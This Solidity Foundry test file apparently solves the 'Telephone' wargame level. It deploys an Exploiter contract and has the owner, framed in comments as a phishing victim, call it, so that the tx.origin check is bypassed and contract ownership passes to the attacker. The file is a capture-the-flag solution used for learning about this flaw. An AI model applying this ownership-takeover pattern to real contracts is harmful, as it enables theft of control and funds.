// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "../src/Telephone.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract TelephoneTest is Test {
    Utilities internal utils;
    Telephone internal telephone;

    address payable internal owner;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        attacker = users[1];
        vm.label(attacker, "Attacker");

        vm.startPrank(owner);
        telephone = new Telephone();

        vm.label(address(telephone), "Telephone");
        assertEq(telephone.owner(), owner);
        vm.stopPrank();
    }

    function testExploit() public {
        // attacker deploy the exploit contract
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter();
        vm.stopPrank();

        vm.startPrank(owner);
        // phishing attack. owner call this contract
        // tx.origin = owner
        exploiter.exploit(telephone, attacker);
        vm.stopPrank();

        assertEq(telephone.owner(), attacker);
    }
}

contract Exploiter {
    function exploit(Telephone _telephone, address attacker) public {
        // msg.sender = address(this)
        // hence tx.origin != msg.sender fulfilled
        _telephone.changeOwner(attacker);
    }
}
